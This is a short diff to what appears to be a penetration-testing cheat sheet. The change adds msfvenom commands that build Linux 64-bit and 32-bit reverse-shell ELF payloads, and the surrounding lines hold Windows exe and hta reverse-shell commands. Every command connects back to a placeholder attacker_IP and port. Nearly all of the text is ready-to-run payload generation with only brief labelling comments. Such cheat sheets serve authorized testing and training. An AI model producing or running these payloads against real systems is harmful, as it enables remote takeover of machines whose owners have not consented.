@@ -1913,6 +1913,12 @@ msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f exe -
 
 # create Windows TCP reverse shell hta
 msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f hta-psh -o revshell.hta
+
+# create Linux TCP reverse shell elf - 64-bit
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f elf -a x64 -o shell.elf
+
+# create Linux TCP reverse shell elf - 32-bit
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f elf -a x86 -o shell.elf
 ```
 
 
